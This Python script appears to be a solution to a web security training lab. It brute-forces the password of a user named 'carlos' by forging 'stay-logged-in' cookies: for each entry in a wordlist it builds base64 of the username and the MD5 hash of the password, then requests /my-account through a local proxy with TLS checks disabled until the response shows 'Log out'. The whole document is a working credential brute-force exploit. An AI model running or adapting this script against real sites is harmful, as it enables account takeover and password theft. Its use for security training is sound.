import requests
import sys
import urllib3
import hashlib
import base64
from pathlib import Path

# Disable insecure request warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Proxy configuration
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}


def access_carlos_account(url: str) -> None:
    print("(+) Brute-forcing Carlos's password...")

    # Path to password file
    password_file = Path('brute-force-of-hashed-pwd/passwords.txt')

    if not password_file.exists():
        print(f"(-) Password file {password_file} not found.")
        sys.exit(1)

    with password_file.open('r') as file, requests.Session() as session:
        for pwd in file:
            pwd = pwd.strip()  # Remove whitespace characters like newline
            hashed_pwd = f'carlos:{hashlib.md5(pwd.encode("utf-8")).hexdigest()}'
            encoded_pwd = base64.b64encode(
                hashed_pwd.encode("utf-8")).decode("utf-8")

            # Perform the request
            myaccount_url = f"{url}/my-account"
            cookies = {'stay-logged-in': encoded_pwd}
            try:
                response = session.get(
                    myaccount_url, cookies=cookies, verify=False, proxies=proxies)
                if "Log out" in response.text:
                    print(f"(+) Carlos's password is: {pwd}")
                    sys.exit(0)
            except requests.RequestException as e:
                print(f"(-) Request failed: {e}")
                sys.exit(1)

        print("(-) Could not find Carlos's password.")


def main() -> None:
    if len(sys.argv) != 2:
        print(f"(+) Usage: {sys.argv[0]} <url>")
        print(f"(+) Example: {sys.argv[0]} www.example.com")
        sys.exit(1)

    url = sys.argv[1]
    access_carlos_account(url)


if __name__ == "__main__":
    main()
